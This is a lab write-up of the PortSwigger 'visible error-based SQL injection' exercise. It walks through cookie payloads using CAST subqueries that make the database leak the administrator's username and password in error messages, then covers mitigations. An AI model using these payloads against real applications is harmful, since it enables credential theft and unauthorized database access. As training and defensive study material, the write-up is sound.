Visible error-based SQL injection

Vulnerability Overview

SQL Injection occurs when an application includes user input directly in an SQL query without proper validation.

Instead of treating the input as data, the database interprets it as part of the SQL command.

In this lab, the application displays detailed database errors. These errors make it possible to retrieve sensitive information such as usernames and passwords.

Goal of the Lab

The goal of this lab is to exploit a visible error-based SQL injection vulnerability in the application's TrackingId cookie. By using SQL injection payloads that trigger database errors, the objective is to leak sensitive information from the database, retrieve the password for the administrator user, and use those credentials to log in and successfully complete the lab.



Exploitation Steps



Step 1: Identifying the SQL Injection Point

The application uses a TrackingId cookie for analytics.

Original cookie:

Cookie: TrackingId=GhCSj6uyEx0N6Q5O; session=...

A single quotation mark was added.

Cookie: TrackingId=GhCSj6uyEx0N6Q5O'; session=...

The request was sent using Burp Repeater.

Response

Unterminated string literal

Explanation

Adding a single quote breaks the SQL query if user input is placed inside quotation marks.

The error confirmed that the TrackingId cookie is vulnerable to SQL injection.



Step 2: Confirming the SQL Injection

The rest of the SQL query was commented out using --.

Cookie: TrackingId=GhCSj6uyEx0N6Q5O'--; session=...

Response

The application loaded normally without any error.

Explanation

The -- characters comment out the remaining SQL statement, preventing the extra quote from causing an error.

This confirmed that SQL injection was possible.



Step 3: Testing if a Subquery Can Be Executed

A simple SQL subquery was tested.

Cookie: TrackingId=GhCSj6uyEx0N6Q5O' AND CAST((SELECT 1) AS int)--; session=...

Response

ERROR: argument of AND must be type boolean, not type integer

Explanation

The AND operator requires a true or false value, but the query returned an integer.

This confirmed that the injected SQL was being executed.



Step 4: Creating a Valid Boolean Condition

The payload was modified.

Cookie: TrackingId=GhCSj6uyEx0N6Q5O' AND 1=CAST((SELECT 1) AS int)--; session=...

Response

The application returned no error.

Explanation

The comparison 1 = 1 evaluates to true, making the SQL query valid.

This confirmed that SQL subqueries could be executed successfully.



Step 5: Trying to Retrieve Usernames

The payload was updated to retrieve usernames.

Cookie: TrackingId=GhCSj6uyEx0N6Q5O' AND 1=CAST((SELECT username FROM users) AS int)--; session=...

Response

Unterminated string literal

Explanation

The payload exceeded the allowed cookie length.

The application truncated the SQL query, causing another string literal error.



Step 6: Handling the "More Than One Row Returned" Error

The original TrackingId value was removed.

Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--; session=...

Response

ERROR: more than one row returned by a subquery used as an expression

Explanation

The query returned several usernames.

Since CAST() expects only one value, the database generated an error.



Step 7: Retrieving the Administrator Username

The query was modified to return only one username.

Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--; session=...

Response

ERROR: invalid input syntax for type integer: "administrator"

Explanation

The database attempted to convert the username into an integer.

The conversion failed, revealing the administrator username in the error message.



Step 8: Retrieving the Administrator Password

The payload was updated to retrieve the password.

Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=...

Response

ERROR: invalid input syntax for type integer: "77166bjqjm2n3fyijb6q"

Explanation

The password could not be converted into an integer.

The resulting error revealed the administrator's password.





Why the Attack Works

The application directly inserts the TrackingId cookie into an SQL query without validating or sanitizing the input.

Because detailed database errors are displayed to the user, attackers can intentionally trigger errors that reveal sensitive information stored in the database.



Mitigation

The vulnerability can be prevented by:

Using parameterized (prepared) SQL queries. 

Validating and sanitizing all user input. 

Avoiding dynamic SQL queries built through string concatenation. 

Displaying generic error messages instead of detailed database errors. 

Applying the principle of least privilege to database accounts. 

Performing regular security testing for SQL injection vulnerabilities. 



Key Takeaways

Never trust user input. 

Detailed database errors can leak sensitive information. 

Error-based SQL injection allows attackers to extract data without displaying query results. 

Prepared statements are one of the most effective defenses against SQL injection. 

Proper error handling is essential for protecting sensitive database information. 



References

PortSwigger Web Security Academy – Visible Error-Based SQL Injection Lab 

OWASP SQL Injection Prevention Cheat Sheet 

